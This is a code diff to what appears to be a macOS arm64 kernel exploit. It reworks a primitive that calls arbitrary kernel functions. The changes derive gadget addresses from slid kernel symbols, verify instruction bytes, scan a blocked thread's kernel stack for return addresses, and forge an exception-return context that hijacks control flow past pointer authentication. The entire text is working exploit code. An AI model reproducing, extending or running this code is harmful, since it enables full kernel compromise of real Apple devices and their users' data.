@@ -27,27 +27,17 @@
 #include "allocator/small_mem.h"
 #include "allocator/large_mem.h"
 #include "util/misc.h"
+#include "util/asm.h"
 
 #include "macos_params.h"
 #include "macos_arm64.h"
 
-#define STACK_SCAN_SIZE 8192
+#define ARM64_THREAD_ERET_ENTRY_OFFSET 0x14c
+#define HV_VPCPU_ERET_ENTRY_OFFSET 0x218
 
-#if MACOS_VERSION == v21E5212f && MACOS_KERNEL_VARIANT == T6000
-#define ERET1_ENTRY 0xfffffe0007253c20
-#define ERET2_ENTRY 0xfffffe000725f09c
-#define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE 0xfffffe00079df578
-#define LR_BLOCK_RELEASE_HELPER 0xfffffe000796cd04
-#define LR_IS_IO_CONNECT_METHOD 0xfffffe00073a9884 // _Xio_connect_method
-#elif MACOS_VERSION == v21E230 && MACOS_KERNEL_VARIANT == T8101
-#define ERET1_ENTRY 0xfffffe0007253c20
-#define ERET2_ENTRY 0xfffffe000725f07c
-#define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE 0xfffffe00079defb4
-#define LR_BLOCK_RELEASE_HELPER 0xfffffe000796c740
-#define LR_IS_IO_CONNECT_METHOD 0xfffffe00073a9760 // _Xio_connect_method
-#else
-#error "unknown platform"
-#endif
+#define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_OFFSET 0x24
+#define LR_IS_IO_CONNECT_METHOD_OFFSET 0x194
+#define LR_BLOCK_RELEASE_DISPOSE_HELPER_OFFSET 0x13c
 
 #define ERET2_ARGS_SIZE (1 << 30)
 
@@ -133,7 +123,12 @@ xe_util_kfunc_t xe_util_kfunc_create(uint free_zone_idx) {
 
 
 void xe_util_kfunc_setup_block_descriptor(xe_util_kfunc_t util) {
-    int64_t diff = (xe_slider_kernel_slide(ERET1_ENTRY) - xe_ptrauth_strip(util->block_descriptor) - TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET);
+    uintptr_t entry = xe_slider_kernel_slide(FUNC_ARM64_THREAD_EXECPTION_RETURN_ADDR) + ARM64_THREAD_ERET_ENTRY_OFFSET;
+    xe_assert_cond(xe_kmem_read_uint32(entry, 0), ==, 0xaa1403e1); // mov x1, x20
+    xe_assert_cond(xe_kmem_read_uint32(entry, 4), ==, 0xaa1503e2); // mov x2, x21
+    xe_assert_cond(xe_kmem_read_uint32(entry, 8), ==, 0xd50040bf); // msr PState.SP, #0x0
+    
+    int64_t diff = (entry - xe_ptrauth_strip(util->block_descriptor) - TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET);
     xe_assert(diff >= INT32_MIN && diff <= INT32_MAX);
     xe_kmem_write_int32(xe_ptrauth_strip(util->block_descriptor), TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET, (int32_t)diff);
 }
@@ -262,25 +257,27 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     
     dispatch_semaphore_wait(sem_surface_destroying, DISPATCH_TIME_FOREVER);
     dispatch_release(sem_surface_destroying);
-    error = xe_util_lck_rw_wait_for_contention(io_statistics_lock, *waiting_thread, 5000);
+    error = xe_util_lck_rw_wait_for_contention(io_statistics_lock, *waiting_thread, 0, NULL);
     xe_assert_err(error);
     
-    uintptr_t kstack = xe_kmem_read_uint64(*waiting_thread, TYPE_THREAD_MEM_MACHINE_OFFSET + TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET);
-    kstack -= STACK_SCAN_SIZE;
+    uintptr_t lr_unregister_event_source = xe_slider_kernel_slide(FUNC_IO_EVENT_SOURCE_FREE_ADDR) + LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_OFFSET;
+    xe_assert_cond(xe_kmem_read_uint32(lr_unregister_event_source - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_ADDR), lr_unregister_event_source - 4));
     
-    char* kstack_buffer = malloc(STACK_SCAN_SIZE);
-    xe_kmem_read(kstack_buffer, kstack, 0, STACK_SCAN_SIZE);
-    uintptr_t lr_unregister_event_source = xe_util_kfunc_find_ptr(kstack, kstack_buffer, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE), XE_PTRAUTH_MASK);
-    xe_assert(lr_unregister_event_source != 0);
-    uintptr_t lr_is_io_connect_method = xe_util_kfunc_find_ptr(kstack, kstack_buffer, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_IS_IO_CONNECT_METHOD), XE_PTRAUTH_MASK);
-    xe_assert(lr_is_io_connect_method != 0);
+    uintptr_t lr_unregister_event_source_stack_ptr;
+    error = xe_xnu_thread_scan_stack(*waiting_thread, lr_unregister_event_source, XE_PTRAUTH_MASK, 1024, &lr_unregister_event_source_stack_ptr);
+    xe_assert_err(error);
     
-    xe_log_debug("found target thread, lr_unregister_event_source: %p and lr_is_io_connect_method: %p", (void*)lr_unregister_event_source, (void*)lr_is_io_connect_method);
+    uintptr_t lr_is_io_connect_method = xe_slider_kernel_slide(FUNC_XIO_CONNECT_METHOD_ADDR) + LR_IS_IO_CONNECT_METHOD_OFFSET;
+    xe_assert_cond(xe_kmem_read_uint32(lr_is_io_connect_method - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_IS_IO_CONNECT_METHOD_ADDR), lr_is_io_connect_method - 4));
     
-    free(kstack_buffer);
+    uintptr_t lr_is_io_connect_method_stack_ptr;
+    error = xe_xnu_thread_scan_stack(*waiting_thread, lr_is_io_connect_method, XE_PTRAUTH_MASK, 1024, &lr_is_io_connect_method_stack_ptr);
+    xe_assert_err(error);
+    
+    xe_log_debug("found target thread, lr_unregister_event_source: %p and lr_is_io_connect_method: %p", (void*)lr_unregister_event_source_stack_ptr, (void*)lr_is_io_connect_method_stack_ptr);
     
     // IOStatistics::unregisterEventSource stack
-    uintptr_t x19 = lr_unregister_event_source - 0x10;
+    uintptr_t x19 = lr_unregister_event_source_stack_ptr - 0x10;
     uintptr_t x20 = x19 - 0x8;
     uintptr_t x21 = x20 - 0x8;
     uintptr_t x22 = x21 - 0x8;
@@ -312,13 +309,17 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     uintptr_t x24_backup = xe_kmem_read_uint64(x24, 0);
     
     // x25 in is_io_connect_method stack
-    uintptr_t x25_backup = xe_kmem_read_uint64(lr_is_io_connect_method - 0x40, 0);
+    uintptr_t x25_backup = xe_kmem_read_uint64(lr_is_io_connect_method_stack_ptr - 0x40, 0);
     // x23 in is_io_connect_method stack
-    uintptr_t x26_backup = xe_kmem_read_uint64(lr_is_io_connect_method - 0x30, 0);
+    uintptr_t x26_backup = xe_kmem_read_uint64(lr_is_io_connect_method_stack_ptr - 0x30, 0);
     
-    uintptr_t sp = lr_unregister_event_source - 0x38 + 0x40 - 0x20;
+    uintptr_t sp = lr_unregister_event_source_stack_ptr - 0x38 + 0x40 - 0x20;
     xe_kmem_write_uint64(util->block, offsetof(struct arm_context, ss.uss.sp), sp);
-    xe_kmem_write_uint64(x20, 0, xe_slider_kernel_slide(ERET2_ENTRY));
+    
+    uintptr_t entry_link2 = xe_slider_kernel_slide(FUNC_ARM64_HV_VCPU_EXCEPTION_RETURN_ADDR) + HV_VPCPU_ERET_ENTRY_OFFSET;
+    xe_assert_cond(xe_kmem_read_uint32(entry_link2, 0), ==, 0xd5184024); // msr elr_el1, x4
+    xe_kmem_write_uint64(x20, 0, entry_link2);
+    
     xe_kmem_write_uint64(x21, 0, 0x400008);
     
     struct arm_context eret2_args;
@@ -339,7 +340,12 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     eret2_args.ss.uss.x[24] = x24_backup;
     eret2_args.ss.uss.x[25] = x25_backup;
     eret2_args.ss.uss.x[26] = x26_backup;
-    eret2_args.ss.uss.lr = xe_slider_kernel_slide(LR_BLOCK_RELEASE_HELPER);
+    
+    uintptr_t lr_block_dispose_helper = xe_slider_kernel_slide(FUNC_BLOCK_RELEASE_ADDR) + LR_BLOCK_RELEASE_DISPOSE_HELPER_OFFSET;
+    xe_assert_cond(xe_kmem_read_uint32(lr_block_dispose_helper - 8, 0), ==, 0xd28557d1); // mov x17, #0x2abe
+    xe_assert_cond(xe_kmem_read_uint32(lr_block_dispose_helper - 4, 0), ==, 0xd73f0911); // blraa x8, 17
+    
+    eret2_args.ss.uss.lr = lr_block_dispose_helper;
     eret2_args.ss.uss.fp = sp + 0x10;
     xe_kmem_write(eret2_arm_context, 0, &eret2_args, sizeof(eret2_args));
     
